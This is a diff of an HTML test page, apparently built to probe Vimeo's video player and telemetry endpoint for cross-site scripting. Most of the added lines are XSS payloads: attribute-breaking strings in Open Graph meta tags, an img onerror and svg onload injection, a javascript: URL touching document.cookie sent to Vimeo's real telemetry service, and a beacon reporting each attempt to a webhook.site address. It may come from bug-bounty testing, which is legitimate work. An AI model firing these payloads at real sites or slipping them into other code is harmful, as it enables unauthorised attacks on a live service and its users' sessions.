@@ -3,22 +3,35 @@
 <head>
     <meta property="og:site_name" content="Vimeo">
     <meta property="og:type" content="video.other">
-    <meta property="og:video:url" content="https://player.vimeo.com/video/403530213/config?callback=alert(1)">
-    <meta property="og:video:secure_url" content="https://player.vimeo.com/video/403530213?callback=alert(document.domain)">
+    <meta property="og:video:url" content="https://player.vimeo.com/video/403530213?autoplay=1&h=b2d568c32d&session-id="><img src=x onerror=alert(1)></meta>">
+    <meta property="og:video:secure_url" content="https://vod-adaptive-ak.vimeocdn.com/exp=1734279368~acl=/e1d9a41a-2c42-4ec6-96c1-80b53b866141/*~hmac="><script>alert(document.domain)</script>">
     <meta property="og:video:type" content="text/html">
-    <meta property="og:video:width" content="NaN">
-    <meta property="og:video:height" content="-1">
+    <meta property="og:video:width" content="640">
+    <meta property="og:video:height" content="360">
     <title>Bug Test</title>
     <script>
     async function attemptExploit() {
         try {
             // Load Vimeo player API
             const script = document.createElement('script');
-            script.src = 'https://player.vimeo.com/api/player.js';
+            script.src = 'https://f.vimeocdn.com/p/4.39.35/js/player.module.js';
             script.onload = () => {
+                // Attempt to inject into telemetry
+                fetch('https://player-telemetry.vimeo.com/add/player-stats', {
+                    method: 'POST',
+                    body: JSON.stringify({
+                        'session-id': '"><img src=x onerror=alert(1)>',
+                        'beacon': '1',
+                        'player_url': 'javascript:alert(document.cookie)'
+                    })
+                });
+
+                // Test session parameter injection
                 const player = new Vimeo.Player('vimeo-player', {
                     url: 'https://player.vimeo.com/video/403530213',
-                    callback: 'alert(1)'
+                    autoplay: true,
+                    h: 'b2d568c32d',
+                    'session-id': '"><svg onload=alert(document.domain)>'
                 });
             };
             document.body.appendChild(script);
@@ -27,7 +40,7 @@
             fetch('https://webhook.site/bbeb07ea-30e9-4522-802f-7e6ad1ccb124', {
                 method: 'POST',
                 body: JSON.stringify({
-                    type: 'callback_injection_attempted',
+                    type: 'telemetry_injection_attempted',
                     timestamp: new Date().toISOString()
                 })
             }).catch(() => {});
